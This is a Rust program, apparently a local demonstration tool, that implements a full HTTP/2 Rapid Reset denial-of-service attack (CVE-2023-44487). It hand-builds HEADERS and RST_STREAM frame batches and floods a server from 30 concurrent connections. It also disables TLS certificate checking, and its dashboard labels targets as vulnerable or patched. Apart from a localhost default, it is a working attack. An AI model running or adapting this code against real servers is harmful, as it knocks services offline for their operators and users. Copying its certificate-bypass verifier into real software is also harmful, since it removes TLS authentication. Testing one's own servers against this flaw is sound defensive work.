use std::sync::Arc;
use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::TlsConnector;
use tokio_rustls::rustls;
use tokio_rustls::rustls::pki_types::ServerName;

const HOST: &str = "127.0.0.1";
const PORT: u16 = 8443;
const CONCURRENT_CONNECTIONS: usize = 30;
const BATCH_SIZE: usize = 100; // 100 HEADERS+RST_STREAM pairs per write buffer
const RECONNECT_DELAY_SECS: u64 = 3; // Cooldown after server GOAWAY/disconnect

// Global Atomic Telemetry
struct Stats {
    active_connections: AtomicUsize,
    total_streams_reset: AtomicU64,
    recent_streams_reset: AtomicU64,
    total_goaways: AtomicU64,
    recent_goaways: AtomicU64,
    last_error_code: AtomicU64,
}

impl Stats {
    fn new() -> Self {
        Self {
            active_connections: AtomicUsize::new(0),
            total_streams_reset: AtomicU64::new(0),
            recent_streams_reset: AtomicU64::new(0),
            total_goaways: AtomicU64::new(0),
            recent_goaways: AtomicU64::new(0),
            last_error_code: AtomicU64::new(u64::MAX),
        }
    }
}

// Certificate Verifier that trusts self-signed certs for local demo
#[derive(Debug)]
struct NoVerifier;

impl rustls::client::danger::ServerCertVerifier for NoVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &ServerName<'_>,
        _ocsp: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _sig: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _sig: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::RSA_PSS_SHA256,
            rustls::SignatureScheme::RSA_PSS_SHA384,
            rustls::SignatureScheme::RSA_PSS_SHA512,
            rustls::SignatureScheme::RSA_PKCS1_SHA256,
            rustls::SignatureScheme::RSA_PKCS1_SHA384,
            rustls::SignatureScheme::RSA_PKCS1_SHA512,
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
            rustls::SignatureScheme::ED25519,
        ]
    }
}

fn error_code_to_name(code: u32) -> &'static str {
    match code {
        0x0 => "NO_ERROR (Nginx mitigation: per-iteration limit)",
        0x1 => "PROTOCOL_ERROR",
        0x2 => "INTERNAL_ERROR",
        0x3 => "FLOW_CONTROL_ERROR",
        0x4 => "SETTINGS_TIMEOUT",
        0x5 => "STREAM_CLOSED",
        0x6 => "FRAME_SIZE_ERROR",
        0x7 => "REFUSED_STREAM",
        0x8 => "CANCEL",
        0x9 => "COMPRESSION_ERROR",
        0xa => "CONNECT_ERROR",
        0xb => "ENHANCE_YOUR_CALM (Apache/nghttp2 mitigation: reset rate limit)",
        0xc => "INADEQUATE_SECURITY",
        0xd => "HTTP_1_1_REQUIRED",
        _ => "UNKNOWN_ERROR",
    }
}

// Build pre-encoded HTTP/2 frames:
// 1. Connection Preface: "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
// 2. Initial empty SETTINGS frame
fn build_preface_and_settings() -> Vec<u8> {
    let mut buf = Vec::with_capacity(33);
    buf.extend_from_slice(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
    // SETTINGS frame: Length 0, Type 4 (SETTINGS), Flags 0, Stream 0
    buf.extend_from_slice(&[0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00]);
    buf
}

// Build a batch of HEADERS + RST_STREAM frame pairs
// HEADERS: HPACK encoded :method: GET (0x82), :path: / (0x84), :scheme: https (0x87), :authority: localhost:8443
// Flags: 0x05 (END_STREAM | END_HEADERS)
// RST_STREAM: Error code 0x08 (CANCEL)
fn build_rapid_reset_batch(start_stream_id: &mut u32, count: usize) -> (Vec<u8>, usize) {
    // HPACK block for GET / https localhost:8443
    // 0x82 -> :method: GET
    // 0x84 -> :path: /
    // 0x87 -> :scheme: https
    // 0x01, 14, b"localhost:8443" -> :authority: localhost:8443
    const HPACK_PAYLOAD: &[u8] = &[
        0x82, 0x84, 0x87, 0x01, 0x0e, b'l', b'o', b'c', b'a', b'l', b'h', b'o', b's', b't', b':',
        b'8', b'4', b'4', b'3',
    ];
    let hpack_len = HPACK_PAYLOAD.len() as u32;

    let pair_size = (9 + HPACK_PAYLOAD.len()) + (9 + 4); // 28 + 13 = 41 bytes
    let mut batch = Vec::with_capacity(pair_size * count);
    let mut generated = 0;

    for _ in 0..count {
        let stream_id = *start_stream_id;
        // HTTP/2 stream identifiers must be strictly odd and fit in 31 bits
        if stream_id > 0x7fff_ffff - 2 {
            *start_stream_id = 1;
            break;
        }
        *start_stream_id += 2;
        generated += 1;

        let id_bytes = stream_id.to_be_bytes();

        // 1. HEADERS frame (28 bytes)
        // Length (24-bit)
        batch.push((hpack_len >> 16) as u8);
        batch.push((hpack_len >> 8) as u8);
        batch.push(hpack_len as u8);
        batch.push(0x01); // Type: HEADERS
        batch.push(0x05); // Flags: END_STREAM | END_HEADERS
        batch.extend_from_slice(&id_bytes);
        batch.extend_from_slice(HPACK_PAYLOAD);

        // 2. RST_STREAM frame (13 bytes)
        // Length = 4
        batch.extend_from_slice(&[0x00, 0x00, 0x04]);
        batch.push(0x03); // Type: RST_STREAM
        batch.push(0x00); // Flags: 0
        batch.extend_from_slice(&id_bytes);
        // Error code: 0x08 (CANCEL)
        batch.extend_from_slice(&[0x00, 0x00, 0x00, 0x08]);
    }

    (batch, generated)
}

async fn worker_loop(
    _worker_id: usize,
    connector: TlsConnector,
    domain: ServerName<'static>,
    stats: Arc<Stats>,
) {
    let addr = format!("{}:{}", HOST, PORT);

    loop {
        // 1. Connect TCP
        let tcp_stream = match TcpStream::connect(&addr).await {
            Ok(s) => {
                let _ = s.set_nodelay(true);
                s
            }
            Err(_) => {
                tokio::time::sleep(Duration::from_millis(1000)).await;
                continue;
            }
        };

        // 2. Perform TLS Handshake
        let tls_stream = match connector.connect(domain.clone(), tcp_stream).await {
            Ok(s) => s,
            Err(_) => {
                tokio::time::sleep(Duration::from_millis(500)).await;
                continue;
            }
        };

        stats.active_connections.fetch_add(1, Ordering::Relaxed);

        // 3. Send HTTP/2 Preface & Initial SETTINGS
        let (mut reader, mut writer) = tokio::io::split(tls_stream);

        let preface = build_preface_and_settings();
        if let Err(_) = writer.write_all(&preface).await {
            stats.active_connections.fetch_sub(1, Ordering::Relaxed);
            continue;
        }

        // 4. Background Server Frame Reader to handle ACKs & catch GOAWAY
        let stats_reader = stats.clone();
        let (shutdown_tx, mut shutdown_rx) = tokio::sync::oneshot::channel::<()>();

        let read_task = tokio::spawn(async move {
            let mut header_buf = [0u8; 9];
            loop {
                // Read 9-byte HTTP/2 frame header
                if reader.read_exact(&mut header_buf).await.is_err() {
                    break;
                }
                let length = ((header_buf[0] as usize) << 16)
                    | ((header_buf[1] as usize) << 8)
                    | (header_buf[2] as usize);
                let frame_type = header_buf[3];

                // Drain payload
                let mut payload = vec![0u8; length];
                if reader.read_exact(&mut payload).await.is_err() {
                    break;
                }

                // Type 0x07 = GOAWAY
                if frame_type == 0x07 && payload.len() >= 8 {
                    let err_code =
                        u32::from_be_bytes([payload[4], payload[5], payload[6], payload[7]]);
                    stats_reader
                        .last_error_code
                        .store(err_code as u64, Ordering::Relaxed);
                    stats_reader.total_goaways.fetch_add(1, Ordering::Relaxed);
                    stats_reader.recent_goaways.fetch_add(1, Ordering::Relaxed);
                    break;
                }
            }
            let _ = shutdown_tx.send(());
        });

        // 5. Send batches of Rapid Reset frames (HEADERS + RST_STREAM)
        let mut stream_id = 1u32;
        let mut connection_closed_by_server = false;

        loop {
            // Check if reader reported GOAWAY or connection closed
            if shutdown_rx.try_recv().is_ok() {
                connection_closed_by_server = true;
                break;
            }

            let (batch_buf, num_streams) = build_rapid_reset_batch(&mut stream_id, BATCH_SIZE);
            if num_streams == 0 {
                break;
            }

            if let Err(_) = writer.write_all(&batch_buf).await {
                connection_closed_by_server = true;
                break;
            }

            stats
                .total_streams_reset
                .fetch_add(num_streams as u64, Ordering::Relaxed);
            stats
                .recent_streams_reset
                .fetch_add(num_streams as u64, Ordering::Relaxed);

            // Yield briefly to tokio runtime
            tokio::task::yield_now().await;
        }

        read_task.abort();
        stats.active_connections.fetch_sub(1, Ordering::Relaxed);

        // When connection is mitigated by the server via GOAWAY/rst,
        // cooldown to clearly show the difference between vulnerable vs patched
        if connection_closed_by_server {
            tokio::time::sleep(Duration::from_secs(RECONNECT_DELAY_SECS)).await;
        }
    }
}

#[tokio::main]
async fn main() {
    println!(
        "\x1b[1;36m====================================================================\x1b[0m"
    );
    println!(
        "\x1b[1;36m   HTTP/2 Rapid Reset (CVE-2023-44487) Demonstration Hammer         \x1b[0m"
    );
    println!(
        "\x1b[1;36m====================================================================\x1b[0m"
    );
    println!("Target:        https://{}:{}", HOST, PORT);
    println!(
        "Workers:       {} persistent connections",
        CONCURRENT_CONNECTIONS
    );
    println!("Batch size:    {} streams per write", BATCH_SIZE);
    println!(
        "Cooldown:      {}s cooldown on GOAWAY mitigation\n",
        RECONNECT_DELAY_SECS
    );

    let stats = Arc::new(Stats::new());

    // Rustls setup with ALPN "h2" and self-signed certificate bypass
    let root_store = rustls::RootCertStore::empty();
    let mut config = rustls::ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();
    config.alpn_protocols = vec![b"h2".to_vec()];
    config
        .dangerous()
        .set_certificate_verifier(Arc::new(NoVerifier));

    let connector = TlsConnector::from(Arc::new(config));
    let domain = ServerName::try_from(HOST.to_string()).unwrap().to_owned();

    // Spawn concurrent hammer workers
    for i in 0..CONCURRENT_CONNECTIONS {
        tokio::spawn(worker_loop(
            i,
            connector.clone(),
            domain.clone(),
            stats.clone(),
        ));
    }

    // Live terminal dashboard (ticker every 1 second)
    let mut ticker = tokio::time::interval(Duration::from_secs(1));
    let start_time = Instant::now();

    loop {
        ticker.tick().await;

        let active = stats.active_connections.load(Ordering::Relaxed);
        let recent_streams = stats.recent_streams_reset.swap(0, Ordering::Relaxed);
        let total_streams = stats.total_streams_reset.load(Ordering::Relaxed);
        let recent_goaway = stats.recent_goaways.swap(0, Ordering::Relaxed);
        let total_goaway = stats.total_goaways.load(Ordering::Relaxed);
        let last_err = stats.last_error_code.load(Ordering::Relaxed);

        let elapsed = start_time.elapsed().as_secs();

        let status_indicator = if recent_streams > 10_000 {
            "\x1b[1;31m[ATTACKING - VULNERABLE]\x1b[0m"
        } else if total_goaway > 0 && active < CONCURRENT_CONNECTIONS / 2 {
            "\x1b[1;32m[MITIGATED - PATCHED]\x1b[0m"
        } else {
            "\x1b[1;33m[CONNECTING]\x1b[0m"
        };

        let last_goaway_str = if last_err == u64::MAX {
            "None".to_string()
        } else {
            format!("0x{:x} ({})", last_err, error_code_to_name(last_err as u32))
        };

        print!("\r\x1b[K"); // Clear line
        println!(
            "{:02}:{:02} {} Active: {:2}/{} | Speed: \x1b[1m{:7} req/s\x1b[0m | Total: {:8} | GOAWAYs: {:3} (+{:2}/s) | Last GOAWAY: \x1b[1;33m{}\x1b[0m",
            elapsed / 60,
            elapsed % 60,
            status_indicator,
            active,
            CONCURRENT_CONNECTIONS,
            recent_streams,
            total_streams,
            total_goaway,
            recent_goaway,
            last_goaway_str,
        );
    }
}
